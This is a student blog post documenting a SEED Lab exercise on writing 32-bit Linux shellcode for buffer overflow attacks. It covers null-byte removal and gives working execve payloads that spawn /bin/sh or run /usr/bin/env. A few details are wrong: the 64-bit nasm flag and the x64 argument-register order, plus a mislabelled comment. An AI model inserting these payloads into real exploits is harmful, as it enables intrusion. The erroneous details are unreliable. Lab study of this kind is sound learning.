---
layout: post
title: Buffer Overflow - Part 1
excerpt:
categories: [assembly, shellcode]
---

In this post, I aim to document my findings and observations while performing a SEED Lab.


A shellcode is a piece of code that is used to spawn a command shell or execute specific commands. It is usually written in assembly (a low-level programming language that is specific to a particular computer architecture or processor). Because computers can either be 32-bit or 64-bit, shellcodes will have to be written for specific architectures, however, 64bit computers can always run 32-bit shellcodes.


Given an assembly code `test.s`, such code can be compiled using nasm 

- on linux:

  - `nasm -f elf32 test.s -o test.o` (for 32-bit)
 
  - `ld -m elf_i386 test.o -o test` (for 32-bit)
 
  - `nasm -f elf32 test.s -o test.o` (for 64-bit)
 
  - `ld -m elf_x86_64 test.o -o test` (for 64-bit)

- on windows:

  - `nasm -f win32 test.s -o test.o` (for 32-bit)
 
  - `nasm -f win64 test.s -o test.o` (for 64-bit)
 
  - `gcc test.obj -o test.exe`


In a buffer overflow attack, we need to make use of the machine code, not the assembly code or executable as we need to include the shellcode in our attacking
code. Thus we need to extract the machine code from the executable file or the object file. One way is to use the objdump command.

- `objdump -Mintel --disassemble test.o`

To make it easy to copy the machine code, we can perform further processing on the output.

- `objdump -Mintel --disassemble test.o | cut -f2 | sed 's/ //g' | tr -d '\n'`


### Using the shellcode in attacking code.

In many cases of buffer-overflow, the vulnerability is caused by the strcpy() function. For the strcpy() function, zero is considered as the end of the string. Therefore, if there is a zero in the middle of the shellcode, the strcpy() fuction will end abruptly, causing the attack to fail. It is therefore necessary that there is no zero in the machine code.

There are many techniques that can get rid of zeros from the shellcode:

- xoring the 32-bit registers and pushing it to the stack

  ```
  xor eax eax
  push eax
  ```

- assigning an 8-bit number to one of the 8-bits registers

  ```
  xor eax eax
  mov al, 0x99
  push eax
  ```

- using bit-shift to replace filler characters i.e. to turn "xyz#" into "xyz\0"

  ```
  ;for computers that are little endian i.e. like reading from right to left
  mov eax "xyz#"
  shl eax, 8
  shr eax, 8
  push eax

  ;for computers that are big endian i.e. like reading from left to right
  mov eax "xyz#"
  shr eax, 8
  shl eax, 8
  push eax
  ```

####  Providing Arguments for System Calls

Linux provides the programmer with system calls that can be easily executed from assembly. These system calls are triggered by using interrupts. `int 0x80` is used to tell the linux kernel to use the EAX, EBX, ECX, and EDX registers to call a function.

When making a system call the 32-bit registers are interpreted as follows:
EAX: this is used to store the function to be called
EBX: this is used to store the first argument to the function
ECX: this is used to store the second argument to the function
EDX: this is used to store the third argument to the function

So in the case of execve we have the function definition as:

```
execve(const char *pathname, char *const _Nullable argv[],
                  char *const _Nullable envp[])
```

This means EAX would store the execve function itself (execve has a system call number of 11), EBX would store the pathname (which in this case is /bin/sh), ECX would store argv[] (which includes the pathname, the arguments, and a null terminator), and EDX would store envp[] (which is the environment variables).

<details>
<summary>Seed lab code</summary>
<pre><code>
section .text
  global _start
    _start:
      ; Store the argument string on stack
      xor eax, eax
      push eax ; Use 0 to terminate the string
      push "//sh" ;
      push "/bin"
      mov ebx, esp ; Get the string address
      ; Construct the argument array argv[]
      push eax ; argv[1] = 0
      push ebx ; argv[0] points to the cmd string
      mov ecx, esp ; Get the address of argv[]
      ; For environment variable
      xor edx, edx ; No env variable
      ; Invoke execve()
      xor eax, eax ; eax = 0x00000000
      mov al, 0x0b ; eax = 0x0000000b
      int 0x80
</code></pre>
</details>

<details>
<summary>My solution to <code>/bin/sh -c "ls -la"</code></summary>
<pre><code>
section .text
  global _start
    _start:
      ; Store the "ls -la" string on stack
      mov edx, "la  "
      shl edx, 16
      shr edx, 16
      push edx
      push "ls -"
      mov edx, esp     ; Get the string address for "ls -la"
      
      ; Store the "-c" string on stack
      mov ecx, "-c  "
      shl ecx, 16
      shr ecx, 16
      push ecx
      mov ecx, esp     ; Get the string address for "-c"
      
      ; Store the "/bin/sh" string on stack
      mov ebx, "/sh "
      shl ebx, 8
      shr ebx, 8
      push ebx
      push "/bin"
      mov  ebx, esp     ; Get the string address for "/bin/sh"

      ; Construct the argument array argv[]
      xor eax, eax      ; ensure eax = 0x00000000
      push eax          ; argv[3] = 0
      push edx          ; argv[2] points to "ls -la"
      push ecx          ; argv[1] points to "-c"
      push ebx          ; argv[0] points to "/bin/sh"
      mov  ecx, esp     ; Get the address of argv[]
   
      ; For environment variable 
      xor  edx, edx     ; No env variables 

      ; Invoke execve()
      xor  eax, eax     ; eax = 0x00000000
      mov   al, 0x0b    ; eax = 0x0000000b
      int 0x80
</code></pre>
</details>

<details>
<summary>My solution to <code>/usr/bin/env</code> (supplying environment variables)</summary>
<pre><code>
section .text
  global _start
    _start:    
      ; Store the environment variable string on the stack
      xor eax, eax
      push eax
      push "1234"
      push "aaa="
      mov eax, esp      ; Get the string address for "aaa=1234"
      
      xor ebx, ebx
      push ebx
      push "5678"
      push "bbb="
      mov ebx, esp      ; Get the string address for "bbb=5678"
      
      mov ecx, "4   "
      shl ecx, 24
      shr ecx, 24
      push ecx
      push "=123"
      push "cccc"
      mov ecx, esp      ; Get the string address for "cccc=1234"
   
      ; For environment variable
      xor  edx, edx     ; edx = 0
      push edx          ; argv[3] = 0
      push eax          ; argv[2] points to "aaa=1234"
      push ebx          ; argv[1] points to "bbb=5678"
      push ecx          ; argv[0] points to "cccc=1234"
      mov edx, esp      ; Get the address of env[]
      
      ; Store the argument string on stack
      xor  eax, eax 
      push eax          ; Use 0 to terminate the string
      push "/env"
      push "/bin"
      push "/usr"
      mov  ebx, esp     ; Get the string address

      ; Construct the argument array argv[]
      push eax          ; argv[1] = 0
      push ebx          ; argv[0] points "/usr/bin/env"
      mov  ecx, esp     ; Get the address of argv[]

      ; Invoke execve()
      xor  eax, eax     ; eax = 0x00000000
      mov   al, 0x0b    ; eax = 0x0000000b
      int 0x80
</code></pre>
</details>

#### Using Code Segment

Rather than dynamically constructing all the necessary data structures on the stack, so their addresses can be obtained from the stack pointer `esp`, data can be stored in the code region, and its address is obtained via the function call mechanism.

<details>
<summary>My solution to <code>/bin/sh -c "ls -la"</code> using code segment</summary>
<pre><code>
section .text
  global _start
    _start:
        BITS 32
	    jmp short two
    one:
 	    pop esi
     	xor eax, eax
 	
 	    mov [esi+7],  al   ; /bin/sh%0
 	    mov [esi+10], al   ; -c%0
 	    mov [esi+17], al   ; ls -la%0
 	
 	    mov [esi+18], esi  ; put address of "/usr/bin/env" in AAAA
 	
 	    lea ebx, [esi+8]   ; get address of "-c"
 	    mov [esi+22], ebx  ; put address of "-c" in BBBB
 	
 	    lea ebx, [esi+11]  ; get address of "ls -la"
 	    mov [esi+26], ebx  ; put address of "ls -la" in CCCC
 	    
 	    mov [esi+30], eax  ; put NULL in DDDD
 	
 	    mov al,  0x0b      ; pass the execve syscall number as argument
 	    mov ebx, esi
 	    lea ecx, [esi+18]  ; /bin/sh -c "ls -la"
 	    lea edx, [esi+30]  ; NULL

 	    int 0x80           ; execve
    two:
 	    call one
 	    db '/bin/sh*-c*ls -la*AAAABBBBCCCCDDDD'
 	       ;01234567890123456789012345678901234
 	       ;          1         2         3
</code></pre>
</details>

<details>
<summary>My solution to <code>/usr/bin/env</code> (supplying environment variables) using code segment</summary>
<pre><code>
section .text
  global _start
    _start:
        BITS 32
	    jmp short two
    one:
 	    pop esi
     	xor eax, eax
 	
 	    mov [esi+12], al   ; /usr/bin/env%0
 	    mov [esi+17], al   ; a=11%0
 	    mov [esi+23], al   ; bb=22%0
 	    mov [esi+32], al   ; ccc=4567%0
 	
 	    mov [esi+33], esi  ; address of /usr/bin/env in AAAA
 	    mov [esi+37], eax  ; put NULL in BBBB (to indicate end of array)
 	
 	    lea ebx, [esi+13]  ; get address of a=11
 	    mov [esi+41], ebx  ; address of a=11 in CCCC
 	
 	    lea ebx, [esi+18]  ; get address of bb=22
 	    mov [esi+45], ebx  ; address of bb=22 in DDDD
 	    
 	    lea ebx, [esi+24]  ; get address of ccc=4567
 	    mov [esi+49], ebx  ; address of ccc=4567 in EEEE
 	
 	    mov al,  0x0b      ; pass the execve syscall number as argument
 	    mov ebx, esi
 	    lea ecx, [esi+33]  ; /usr/bin/env
 	    lea edx, [esi+41]  ; a=11,bb=22,ccc=4567

 	    int 0x80           ; execve
    two:
 	    call one
 	    db '/usr/bin/env*a=11*bb=22*ccc=4567*AAAABBBBCCCCDDDDEEEE'
 	    ;   01234567890123456789012345678901234567890123456789012
 	    ;             1         2         3         4         5 
</code></pre>
</details>

Writing 64-bit shellcode is not too different to writing 32-bit shellcode. The differences are mainly in the registers. For the x64 architecture, invoking system call
is done through the syscall instruction, and the first three arguments for the system call are stored in the rdx, rsi, rdi registers, respectively.
<details>
<summary>64-bit equivalent registers</summary>
<ul>
<li>eax = rax</li>
<li>ebx = rdi</li>
<li>ecx = rsi</li>
<li>edx = rdx</li>
</ul>
</details>





